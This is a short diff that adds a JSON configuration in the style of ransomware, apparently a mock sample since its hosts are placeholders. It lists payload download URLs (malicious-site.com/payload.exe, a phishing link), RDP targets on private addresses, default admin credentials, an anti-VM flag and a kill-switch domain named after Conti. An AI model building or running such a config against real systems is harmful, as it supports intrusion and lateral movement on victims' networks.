@@ -1,0 +1,16 @@
+{
+  "infection_urls": [
+    "http://malicious-site.com/payload.exe",
+    "http://phishing-link.com/download"
+  ],
+  "rdp_targets": [
+    "192.168.1.100:3389",
+    "10.0.0.50:3389"
+  ],
+  "credentials": {
+    "username": "admin",
+    "password": "password123"
+  },
+  "anti_vm_checks": true,
+  "kill_switch_domain": "conti-killswitch.onion"
+}
